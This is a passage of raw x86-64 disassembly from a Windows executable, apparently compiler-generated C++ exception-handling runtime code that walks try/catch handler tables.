   140002b8c:	41 8d 49 ff          	lea    -0x1(%r9),%ecx
   140002b90:	49 8d 04 ca          	lea    (%r10,%rcx,8),%rax
   140002b94:	42 8b 44 18 04       	mov    0x4(%rax,%r11,1),%eax
   140002b99:	48 83 c4 20          	add    $0x20,%rsp
   140002b9d:	5b                   	pop    %rbx
   140002b9e:	c3                   	ret
   140002b9f:	83 c8 ff             	or     $0xffffffff,%eax
   140002ba2:	eb f5                	jmp    0x140002b99
   140002ba4:	e8 1f 2b 00 00       	call   0x1400056c8
   140002ba9:	cc                   	int3
   140002baa:	cc                   	int3
   140002bab:	cc                   	int3
   140002bac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002bb1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002bb6:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140002bbb:	41 55                	push   %r13
   140002bbd:	41 56                	push   %r14
   140002bbf:	41 57                	push   %r15
   140002bc1:	48 83 ec 30          	sub    $0x30,%rsp
   140002bc5:	4d 8b f1             	mov    %r9,%r14
   140002bc8:	49 8b d8             	mov    %r8,%rbx
   140002bcb:	48 8b f2             	mov    %rdx,%rsi
   140002bce:	4c 8b e9             	mov    %rcx,%r13
   140002bd1:	33 ff                	xor    %edi,%edi
   140002bd3:	41 39 78 04          	cmp    %edi,0x4(%r8)
   140002bd7:	74 0f                	je     0x140002be8
   140002bd9:	4d 63 78 04          	movslq 0x4(%r8),%r15
   140002bdd:	e8 d2 fd ff ff       	call   0x1400029b4
   140002be2:	49 8d 14 07          	lea    (%r15,%rax,1),%rdx
   140002be6:	eb 06                	jmp    0x140002bee
   140002be8:	48 8b d7             	mov    %rdi,%rdx
   140002beb:	44 8b ff             	mov    %edi,%r15d
   140002bee:	48 85 d2             	test   %rdx,%rdx
   140002bf1:	0f 84 77 01 00 00    	je     0x140002d6e
   140002bf7:	45 85 ff             	test   %r15d,%r15d
   140002bfa:	74 11                	je     0x140002c0d
   140002bfc:	e8 b3 fd ff ff       	call   0x1400029b4
   140002c01:	48 8b c8             	mov    %rax,%rcx
   140002c04:	48 63 43 04          	movslq 0x4(%rbx),%rax
   140002c08:	48 03 c8             	add    %rax,%rcx
   140002c0b:	eb 03                	jmp    0x140002c10
   140002c0d:	48 8b cf             	mov    %rdi,%rcx
   140002c10:	40 38 79 10          	cmp    %dil,0x10(%rcx)
   140002c14:	0f 84 54 01 00 00    	je     0x140002d6e
   140002c1a:	39 7b 08             	cmp    %edi,0x8(%rbx)
   140002c1d:	75 08                	jne    0x140002c27
   140002c1f:	39 3b                	cmp    %edi,(%rbx)
   140002c21:	0f 8d 47 01 00 00    	jge    0x140002d6e
   140002c27:	39 3b                	cmp    %edi,(%rbx)
   140002c29:	7c 0a                	jl     0x140002c35
   140002c2b:	48 63 43 08          	movslq 0x8(%rbx),%rax
   140002c2f:	48 03 06             	add    (%rsi),%rax
   140002c32:	48 8b f0             	mov    %rax,%rsi
   140002c35:	f6 03 80             	testb  $0x80,(%rbx)
   140002c38:	74 32                	je     0x140002c6c
   140002c3a:	41 f6 06 10          	testb  $0x10,(%r14)
   140002c3e:	74 2c                	je     0x140002c6c
   140002c40:	48 8b 05 09 5f 01 00 	mov    0x15f09(%rip),%rax        # 0x140018b50
   140002c47:	48 85 c0             	test   %rax,%rax
   140002c4a:	74 20                	je     0x140002c6c
   140002c4c:	ff 15 0e b6 00 00    	call   *0xb60e(%rip)        # 0x14000e260
   140002c52:	48 85 c0             	test   %rax,%rax
   140002c55:	0f 84 2f 01 00 00    	je     0x140002d8a
   140002c5b:	48 85 f6             	test   %rsi,%rsi
   140002c5e:	0f 84 26 01 00 00    	je     0x140002d8a
   140002c64:	48 89 06             	mov    %rax,(%rsi)
   140002c67:	48 8b c8             	mov    %rax,%rcx
   140002c6a:	eb 5f                	jmp    0x140002ccb
   140002c6c:	f6 03 08             	testb  $0x8,(%rbx)
   140002c6f:	74 1b                	je     0x140002c8c
   140002c71:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   140002c75:	48 85 c9             	test   %rcx,%rcx
   140002c78:	0f 84 11 01 00 00    	je     0x140002d8f
   140002c7e:	48 85 f6             	test   %rsi,%rsi
   140002c81:	0f 84 08 01 00 00    	je     0x140002d8f
   140002c87:	48 89 0e             	mov    %rcx,(%rsi)
   140002c8a:	eb 3f                	jmp    0x140002ccb
   140002c8c:	41 f6 06 01          	testb  $0x1,(%r14)
   140002c90:	74 4a                	je     0x140002cdc
   140002c92:	49 8b 55 28          	mov    0x28(%r13),%rdx
   140002c96:	48 85 d2             	test   %rdx,%rdx
   140002c99:	0f 84 f5 00 00 00    	je     0x140002d94
   140002c9f:	48 85 f6             	test   %rsi,%rsi
   140002ca2:	0f 84 ec 00 00 00    	je     0x140002d94
   140002ca8:	4d 63 46 14          	movslq 0x14(%r14),%r8
   140002cac:	48 8b ce             	mov    %rsi,%rcx
   140002caf:	e8 3c a6 00 00       	call   0x14000d2f0
   140002cb4:	41 83 7e 14 08       	cmpl   $0x8,0x14(%r14)
   140002cb9:	0f 85 ab 00 00 00    	jne    0x140002d6a
   140002cbf:	48 39 3e             	cmp    %rdi,(%rsi)
   140002cc2:	0f 84 a2 00 00 00    	je     0x140002d6a
   140002cc8:	48 8b 0e             	mov    (%rsi),%rcx
   140002ccb:	49 8d 56 08          	lea    0x8(%r14),%rdx
   140002ccf:	e8 d4 f1 ff ff       	call   0x140001ea8
   140002cd4:	48 89 06             	mov    %rax,(%rsi)
   140002cd7:	e9 8e 00 00 00       	jmp    0x140002d6a
   140002cdc:	41 39 7e 18          	cmp    %edi,0x18(%r14)
   140002ce0:	74 0f                	je     0x140002cf1
   140002ce2:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   140002ce6:	e8 dd fc ff ff       	call   0x1400029c8
   140002ceb:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   140002cef:	eb 05                	jmp    0x140002cf6
   140002cf1:	48 8b cf             	mov    %rdi,%rcx
   140002cf4:	8b df                	mov    %edi,%ebx
   140002cf6:	48 85 c9             	test   %rcx,%rcx
   140002cf9:	75 34                	jne    0x140002d2f
   140002cfb:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   140002cff:	0f 84 94 00 00 00    	je     0x140002d99
   140002d05:	48 85 f6             	test   %rsi,%rsi
   140002d08:	0f 84 8b 00 00 00    	je     0x140002d99
   140002d0e:	49 63 5e 14          	movslq 0x14(%r14),%rbx
   140002d12:	49 8d 56 08          	lea    0x8(%r14),%rdx
   140002d16:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   140002d1a:	e8 89 f1 ff ff       	call   0x140001ea8
   140002d1f:	48 8b d0             	mov    %rax,%rdx
   140002d22:	4c 8b c3             	mov    %rbx,%r8
   140002d25:	48 8b ce             	mov    %rsi,%rcx
   140002d28:	e8 c3 a5 00 00       	call   0x14000d2f0
   140002d2d:	eb 3b                	jmp    0x140002d6a
   140002d2f:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   140002d33:	74 69                	je     0x140002d9e
   140002d35:	48 85 f6             	test   %rsi,%rsi
   140002d38:	74 64                	je     0x140002d9e
   140002d3a:	85 db                	test   %ebx,%ebx
   140002d3c:	74 11                	je     0x140002d4f
   140002d3e:	e8 85 fc ff ff       	call   0x1400029c8
   140002d43:	48 8b c8             	mov    %rax,%rcx
   140002d46:	49 63 46 18          	movslq 0x18(%r14),%rax
   140002d4a:	48 03 c8             	add    %rax,%rcx
   140002d4d:	eb 03                	jmp    0x140002d52
   140002d4f:	48 8b cf             	mov    %rdi,%rcx
   140002d52:	48 85 c9             	test   %rcx,%rcx
   140002d55:	74 47                	je     0x140002d9e
   140002d57:	41 8a 06             	mov    (%r14),%al
   140002d5a:	24 04                	and    $0x4,%al
   140002d5c:	f6 d8                	neg    %al
   140002d5e:	1b c9                	sbb    %ecx,%ecx
   140002d60:	f7 d9                	neg    %ecx
   140002d62:	ff c1                	inc    %ecx
   140002d64:	8b f9                	mov    %ecx,%edi
   140002d66:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140002d6a:	8b c7                	mov    %edi,%eax
   140002d6c:	eb 02                	jmp    0x140002d70
   140002d6e:	33 c0                	xor    %eax,%eax
   140002d70:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140002d75:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140002d7a:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140002d7f:	48 83 c4 30          	add    $0x30,%rsp
   140002d83:	41 5f                	pop    %r15
   140002d85:	41 5e                	pop    %r14
   140002d87:	41 5d                	pop    %r13
   140002d89:	c3                   	ret
   140002d8a:	e8 39 29 00 00       	call   0x1400056c8
   140002d8f:	e8 34 29 00 00       	call   0x1400056c8
   140002d94:	e8 2f 29 00 00       	call   0x1400056c8
   140002d99:	e8 2a 29 00 00       	call   0x1400056c8
   140002d9e:	e8 25 29 00 00       	call   0x1400056c8
   140002da3:	90                   	nop
   140002da4:	e8 1f 29 00 00       	call   0x1400056c8
   140002da9:	90                   	nop
   140002daa:	cc                   	int3
   140002dab:	cc                   	int3
   140002dac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002db1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002db6:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140002dbb:	41 56                	push   %r14
   140002dbd:	48 83 ec 20          	sub    $0x20,%rsp
   140002dc1:	49 8b f9             	mov    %r9,%rdi
   140002dc4:	4c 8b f1             	mov    %rcx,%r14
   140002dc7:	33 db                	xor    %ebx,%ebx
   140002dc9:	41 39 18             	cmp    %ebx,(%r8)
   140002dcc:	7d 05                	jge    0x140002dd3
   140002dce:	48 8b f2             	mov    %rdx,%rsi
   140002dd1:	eb 07                	jmp    0x140002dda
   140002dd3:	49 63 70 08          	movslq 0x8(%r8),%rsi
   140002dd7:	48 03 32             	add    (%rdx),%rsi
   140002dda:	e8 cd fd ff ff       	call   0x140002bac
   140002ddf:	83 e8 01             	sub    $0x1,%eax
   140002de2:	74 3c                	je     0x140002e20
   140002de4:	83 f8 01             	cmp    $0x1,%eax
   140002de7:	75 67                	jne    0x140002e50
   140002de9:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   140002ded:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   140002df1:	e8 b2 f0 ff ff       	call   0x140001ea8
   140002df6:	4c 8b f0             	mov    %rax,%r14
   140002df9:	39 5f 18             	cmp    %ebx,0x18(%rdi)
   140002dfc:	74 0c                	je     0x140002e0a
   140002dfe:	e8 c5 fb ff ff       	call   0x1400029c8
   140002e03:	48 63 5f 18          	movslq 0x18(%rdi),%rbx
   140002e07:	48 03 d8             	add    %rax,%rbx
   140002e0a:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140002e10:	4d 8b c6             	mov    %r14,%r8
   140002e13:	48 8b d3             	mov    %rbx,%rdx
   140002e16:	48 8b ce             	mov    %rsi,%rcx
   140002e19:	e8 e2 12 00 00       	call   0x140004100
   140002e1e:	eb 30                	jmp    0x140002e50
   140002e20:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   140002e24:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   140002e28:	e8 7b f0 ff ff       	call   0x140001ea8
   140002e2d:	4c 8b f0             	mov    %rax,%r14
   140002e30:	39 5f 18             	cmp    %ebx,0x18(%rdi)
   140002e33:	74 0c                	je     0x140002e41
   140002e35:	e8 8e fb ff ff       	call   0x1400029c8
   140002e3a:	48 63 5f 18          	movslq 0x18(%rdi),%rbx
   140002e3e:	48 03 d8             	add    %rax,%rbx
   140002e41:	4d 8b c6             	mov    %r14,%r8
   140002e44:	48 8b d3             	mov    %rbx,%rdx
   140002e47:	48 8b ce             	mov    %rsi,%rcx
   140002e4a:	e8 a5 12 00 00       	call   0x1400040f4
   140002e4f:	90                   	nop
   140002e50:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002e55:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002e5a:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140002e5f:	48 83 c4 20          	add    $0x20,%rsp
   140002e63:	41 5e                	pop    %r14
   140002e65:	c3                   	ret
   140002e66:	e8 5d 28 00 00       	call   0x1400056c8
   140002e6b:	90                   	nop
   140002e6c:	48 8b c4             	mov    %rsp,%rax
   140002e6f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140002e73:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140002e77:	55                   	push   %rbp
   140002e78:	56                   	push   %rsi
   140002e79:	57                   	push   %rdi
   140002e7a:	41 54                	push   %r12
   140002e7c:	41 55                	push   %r13
   140002e7e:	41 56                	push   %r14
   140002e80:	41 57                	push   %r15
   140002e82:	48 83 ec 60          	sub    $0x60,%rsp
   140002e86:	4c 8b ac 24 c0 00 00 	mov    0xc0(%rsp),%r13
   140002e8d:	00 
   140002e8e:	4d 8b f9             	mov    %r9,%r15
   140002e91:	4c 8b e2             	mov    %rdx,%r12
   140002e94:	4c 8d 48 10          	lea    0x10(%rax),%r9
   140002e98:	48 8b e9             	mov    %rcx,%rbp
   140002e9b:	4d 8b c5             	mov    %r13,%r8
   140002e9e:	49 8b d7             	mov    %r15,%rdx
   140002ea1:	49 8b cc             	mov    %r12,%rcx
   140002ea4:	e8 73 f7 ff ff       	call   0x14000261c
   140002ea9:	4c 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%r9
   140002eb0:	00 
   140002eb1:	4c 8b f0             	mov    %rax,%r14
   140002eb4:	48 8b b4 24 c8 00 00 	mov    0xc8(%rsp),%rsi
   140002ebb:	00 
   140002ebc:	4d 85 c9             	test   %r9,%r9
   140002ebf:	74 0e                	je     0x140002ecf
   140002ec1:	4c 8b c6             	mov    %rsi,%r8
   140002ec4:	48 8b d0             	mov    %rax,%rdx
   140002ec7:	48 8b cd             	mov    %rbp,%rcx
   140002eca:	e8 dd fe ff ff       	call   0x140002dac
   140002ecf:	48 8b 8c 24 d8 00 00 	mov    0xd8(%rsp),%rcx
   140002ed6:	00 
   140002ed7:	8b 59 08             	mov    0x8(%rcx),%ebx
   140002eda:	8b 39                	mov    (%rcx),%edi
   140002edc:	e8 d3 fa ff ff       	call   0x1400029b4
   140002ee1:	48 63 4e 0c          	movslq 0xc(%rsi),%rcx
   140002ee5:	4d 8b ce             	mov    %r14,%r9
   140002ee8:	4c 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%r8
   140002eef:	00 
   140002ef0:	48 03 c1             	add    %rcx,%rax
   140002ef3:	8a 8c 24 f8 00 00 00 	mov    0xf8(%rsp),%cl
   140002efa:	48 8b d5             	mov    %rbp,%rdx
   140002efd:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   140002f01:	49 8b cc             	mov    %r12,%rcx
   140002f04:	4c 89 7c 24 48       	mov    %r15,0x48(%rsp)
   140002f09:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140002f0e:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   140002f12:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   140002f16:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   140002f1b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002f20:	e8 fb f8 ff ff       	call   0x140002820
   140002f25:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   140002f2c:	00 
   140002f2d:	48 83 c4 60          	add    $0x60,%rsp
   140002f31:	41 5f                	pop    %r15
   140002f33:	41 5e                	pop    %r14
   140002f35:	41 5d                	pop    %r13
   140002f37:	41 5c                	pop    %r12
   140002f39:	5f                   	pop    %rdi
   140002f3a:	5e                   	pop    %rsi
   140002f3b:	5d                   	pop    %rbp
   140002f3c:	c3                   	ret
   140002f3d:	cc                   	int3
   140002f3e:	cc                   	int3
   140002f3f:	cc                   	int3
   140002f40:	40 55                	rex push %rbp
   140002f42:	53                   	push   %rbx
   140002f43:	56                   	push   %rsi
   140002f44:	57                   	push   %rdi
   140002f45:	41 54                	push   %r12
   140002f47:	41 55                	push   %r13
   140002f49:	41 56                	push   %r14
   140002f4b:	41 57                	push   %r15
   140002f4d:	48 8d 6c 24 d8       	lea    -0x28(%rsp),%rbp
   140002f52:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
   140002f59:	48 8b 05 e0 50 01 00 	mov    0x150e0(%rip),%rax        # 0x140018040
   140002f60:	48 33 c4             	xor    %rsp,%rax
   140002f63:	48 89 45 18          	mov    %rax,0x18(%rbp)
   140002f67:	48 8b bd 90 00 00 00 	mov    0x90(%rbp),%rdi
   140002f6e:	4c 8b e2             	mov    %rdx,%r12
   140002f71:	4c 8b ad a8 00 00 00 	mov    0xa8(%rbp),%r13
   140002f78:	4d 8b f8             	mov    %r8,%r15
   140002f7b:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   140002f80:	48 8b d9             	mov    %rcx,%rbx
   140002f83:	48 89 54 24 78       	mov    %rdx,0x78(%rsp)
   140002f88:	4c 8b c7             	mov    %rdi,%r8
   140002f8b:	49 8b cc             	mov    %r12,%rcx
   140002f8e:	4c 89 6d a0          	mov    %r13,-0x60(%rbp)
   140002f92:	49 8b d1             	mov    %r9,%rdx
   140002f95:	c6 44 24 60 00       	movb   $0x0,0x60(%rsp)
   140002f9a:	49 8b f1             	mov    %r9,%rsi
   140002f9d:	e8 42 0f 00 00       	call   0x140003ee4
   140002fa2:	44 8b f0             	mov    %eax,%r14d
   140002fa5:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002fa8:	0f 8c 5b 04 00 00    	jl     0x140003409
   140002fae:	3b 47 04             	cmp    0x4(%rdi),%eax
   140002fb1:	0f 8d 52 04 00 00    	jge    0x140003409
   140002fb7:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140002fbd:	0f 85 c9 00 00 00    	jne    0x14000308c
   140002fc3:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140002fc7:	0f 85 bf 00 00 00    	jne    0x14000308c
   140002fcd:	8b 43 20             	mov    0x20(%rbx),%eax
   140002fd0:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140002fd5:	83 f8 02             	cmp    $0x2,%eax
   140002fd8:	0f 87 ae 00 00 00    	ja     0x14000308c
   140002fde:	48 83 7b 30 00       	cmpq   $0x0,0x30(%rbx)
   140002fe3:	0f 85 a3 00 00 00    	jne    0x14000308c
   140002fe9:	e8 3e f0 ff ff       	call   0x14000202c
   140002fee:	48 83 78 20 00       	cmpq   $0x0,0x20(%rax)
   140002ff3:	0f 84 a9 03 00 00    	je     0x1400033a2
   140002ff9:	e8 2e f0 ff ff       	call   0x14000202c
   140002ffe:	48 8b 58 20          	mov    0x20(%rax),%rbx
   140003002:	e8 25 f0 ff ff       	call   0x14000202c
   140003007:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   14000300b:	c6 44 24 60 01       	movb   $0x1,0x60(%rsp)
   140003010:	4c 8b 78 28          	mov    0x28(%rax),%r15
   140003014:	4c 89 7c 24 68       	mov    %r15,0x68(%rsp)
   140003019:	e8 d6 f9 ff ff       	call   0x1400029f4
   14000301e:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140003024:	75 1e                	jne    0x140003044
   140003026:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   14000302a:	75 18                	jne    0x140003044
   14000302c:	8b 43 20             	mov    0x20(%rbx),%eax
   14000302f:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140003034:	83 f8 02             	cmp    $0x2,%eax
   140003037:	77 0b                	ja     0x140003044
   140003039:	48 83 7b 30 00       	cmpq   $0x0,0x30(%rbx)
   14000303e:	0f 84 c5 03 00 00    	je     0x140003409
   140003044:	e8 e3 ef ff ff       	call   0x14000202c
   140003049:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   14000304e:	74 3c                	je     0x14000308c
   140003050:	e8 d7 ef ff ff       	call   0x14000202c
   140003055:	4c 8b 78 38          	mov    0x38(%rax),%r15
   140003059:	e8 ce ef ff ff       	call   0x14000202c
   14000305e:	49 8b d7             	mov    %r15,%rdx
   140003061:	48 8b cb             	mov    %rbx,%rcx
   140003064:	48 83 60 38 00       	andq   $0x0,0x38(%rax)
   140003069:	e8 0e 0f 00 00       	call   0x140003f7c
   14000306e:	84 c0                	test   %al,%al
   140003070:	75 15                	jne    0x140003087
   140003072:	49 8b cf             	mov    %r15,%rcx
   140003075:	e8 f2 0f 00 00       	call   0x14000406c
   14000307a:	84 c0                	test   %al,%al
   14000307c:	0f 84 64 03 00 00    	je     0x1400033e6
   140003082:	e9 3b 03 00 00       	jmp    0x1400033c2
   140003087:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   14000308c:	48 8b 46 08          	mov    0x8(%rsi),%rax
   140003090:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140003094:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   140003098:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000309e:	0f 85 b5 02 00 00    	jne    0x140003359
   1400030a4:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   1400030a8:	0f 85 ab 02 00 00    	jne    0x140003359
   1400030ae:	8b 43 20             	mov    0x20(%rbx),%eax
   1400030b1:	2d 20 05 93 19       	sub    $0x19930520,%eax
   1400030b6:	83 f8 02             	cmp    $0x2,%eax
   1400030b9:	0f 87 9a 02 00 00    	ja     0x140003359
   1400030bf:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   1400030c3:	0f 86 c0 01 00 00    	jbe    0x140003289
   1400030c9:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   1400030cf:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   1400030d3:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400030d7:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400030db:	4c 8b ce             	mov    %rsi,%r9
   1400030de:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400030e3:	45 8b c6             	mov    %r14d,%r8d
   1400030e6:	e8 01 f6 ff ff       	call   0x1400026ec
   1400030eb:	0f 10 4d e0          	movups -0x20(%rbp),%xmm1
   1400030ef:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1400030f3:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   1400030f8:	66 0f 7e c0          	movd   %xmm0,%eax
   1400030fc:	f3 0f 7f 4d d0       	movdqu %xmm1,-0x30(%rbp)
   140003101:	3b 45 f8             	cmp    -0x8(%rbp),%eax
   140003104:	0f 83 7f 01 00 00    	jae    0x140003289
   14000310a:	44 8b 7d d8          	mov    -0x28(%rbp),%r15d
   14000310e:	66 49 0f 7e c9       	movq   %xmm1,%r9
   140003113:	4c 89 4d 88          	mov    %r9,-0x78(%rbp)
   140003117:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   14000311b:	48 8b 00             	mov    (%rax),%rax
   14000311e:	48 63 50 10          	movslq 0x10(%rax),%rdx
   140003122:	41 8b c7             	mov    %r15d,%eax
   140003125:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140003129:	49 8b 41 08          	mov    0x8(%r9),%rax
   14000312d:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   140003131:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   140003136:	49 63 4c 00 10       	movslq 0x10(%r8,%rax,1),%rcx
   14000313b:	89 4d b8             	mov    %ecx,-0x48(%rbp)
   14000313e:	66 0f 7e c0          	movd   %xmm0,%eax
   140003142:	0f 11 45 a8          	movups %xmm0,-0x58(%rbp)
   140003146:	41 3b c6             	cmp    %r14d,%eax
   140003149:	0f 8f 2d 01 00 00    	jg     0x14000327c
   14000314f:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140003154:	48 c1 e8 20          	shr    $0x20,%rax
   140003158:	44 3b f0             	cmp    %eax,%r14d
   14000315b:	0f 8f 1b 01 00 00    	jg     0x14000327c
   140003161:	48 03 4e 08          	add    0x8(%rsi),%rcx
   140003165:	45 33 e4             	xor    %r12d,%r12d
   140003168:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   14000316d:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140003172:	48 89 4d 98          	mov    %rcx,-0x68(%rbp)
   140003176:	48 c1 e8 20          	shr    $0x20,%rax
   14000317a:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   14000317e:	85 c0                	test   %eax,%eax
   140003180:	0f 84 e6 00 00 00    	je     0x14000326c
   140003186:	4b 8d 04 a4          	lea    (%r12,%r12,4),%rax
   14000318a:	0f 10 04 81          	movups (%rcx,%rax,4),%xmm0
   14000318e:	0f 11 45 00          	movups %xmm0,0x0(%rbp)
   140003192:	8b 44 81 10          	mov    0x10(%rcx,%rax,4),%eax
   140003196:	89 45 10             	mov    %eax,0x10(%rbp)
   140003199:	e8 2a f8 ff ff       	call   0x1400029c8
   14000319e:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   1400031a2:	48 83 c0 04          	add    $0x4,%rax
   1400031a6:	48 63 51 0c          	movslq 0xc(%rcx),%rdx
   1400031aa:	48 03 c2             	add    %rdx,%rax
   1400031ad:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400031b2:	e8 11 f8 ff ff       	call   0x1400029c8
   1400031b7:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   1400031bb:	48 63 51 0c          	movslq 0xc(%rcx),%rdx
   1400031bf:	44 8b 2c 10          	mov    (%rax,%rdx,1),%r13d
   1400031c3:	eb 31                	jmp    0x1400031f6
   1400031c5:	e8 fe f7 ff ff       	call   0x1400029c8
   1400031ca:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400031cf:	4c 8b 43 30          	mov    0x30(%rbx),%r8
   1400031d3:	48 63 09             	movslq (%rcx),%rcx
   1400031d6:	48 03 c1             	add    %rcx,%rax
   1400031d9:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400031dd:	48 8b d0             	mov    %rax,%rdx
   1400031e0:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   1400031e4:	e8 97 04 00 00       	call   0x140003680
   1400031e9:	85 c0                	test   %eax,%eax
   1400031eb:	75 20                	jne    0x14000320d
   1400031ed:	41 ff cd             	dec    %r13d
   1400031f0:	48 83 44 24 70 04    	addq   $0x4,0x70(%rsp)
   1400031f6:	45 85 ed             	test   %r13d,%r13d
   1400031f9:	7f ca                	jg     0x1400031c5
   1400031fb:	41 ff c4             	inc    %r12d
   1400031fe:	44 3b 65 90          	cmp    -0x70(%rbp),%r12d
   140003202:	74 6f                	je     0x140003273
   140003204:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   140003208:	e9 79 ff ff ff       	jmp    0x140003186
   14000320d:	8a 85 98 00 00 00    	mov    0x98(%rbp),%al
   140003213:	4c 8b ce             	mov    %rsi,%r9
   140003216:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   14000321b:	48 8b cb             	mov    %rbx,%rcx
   14000321e:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140003223:	49 8b d4             	mov    %r12,%rdx
   140003226:	88 44 24 58          	mov    %al,0x58(%rsp)
   14000322a:	8a 44 24 60          	mov    0x60(%rsp),%al
   14000322e:	88 44 24 50          	mov    %al,0x50(%rsp)
   140003232:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
   140003236:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000323b:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   140003241:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140003245:	48 8d 45 a8          	lea    -0x58(%rbp),%rax
   140003249:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000324e:	48 8b 45 80          	mov    -0x80(%rbp),%rax
   140003252:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003257:	48 8d 45 00          	lea    0x0(%rbp),%rax
   14000325b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003260:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003265:	e8 02 fc ff ff       	call   0x140002e6c
   14000326a:	eb 0c                	jmp    0x140003278
   14000326c:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   140003271:	eb 09                	jmp    0x14000327c
   140003273:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   140003278:	4c 8b 4d 88          	mov    -0x78(%rbp),%r9
   14000327c:	41 ff c7             	inc    %r15d
   14000327f:	44 3b 7d f8          	cmp    -0x8(%rbp),%r15d
   140003283:	0f 82 8e fe ff ff    	jb     0x140003117
   140003289:	8b 07                	mov    (%rdi),%eax
   14000328b:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   140003290:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   140003295:	0f 82 fb 00 00 00    	jb     0x140003396
   14000329b:	83 7f 20 00          	cmpl   $0x0,0x20(%rdi)
   14000329f:	74 0e                	je     0x1400032af
   1400032a1:	e8 0e f7 ff ff       	call   0x1400029b4
   1400032a6:	48 63 4f 20          	movslq 0x20(%rdi),%rcx
   1400032aa:	48 03 c1             	add    %rcx,%rax
   1400032ad:	75 21                	jne    0x1400032d0
   1400032af:	8b 47 24             	mov    0x24(%rdi),%eax
   1400032b2:	c1 e8 02             	shr    $0x2,%eax
   1400032b5:	a8 01                	test   $0x1,%al
   1400032b7:	0f 84 d9 00 00 00    	je     0x140003396
   1400032bd:	48 8b d7             	mov    %rdi,%rdx
   1400032c0:	48 8b ce             	mov    %rsi,%rcx
   1400032c3:	e8 c4 f2 ff ff       	call   0x14000258c
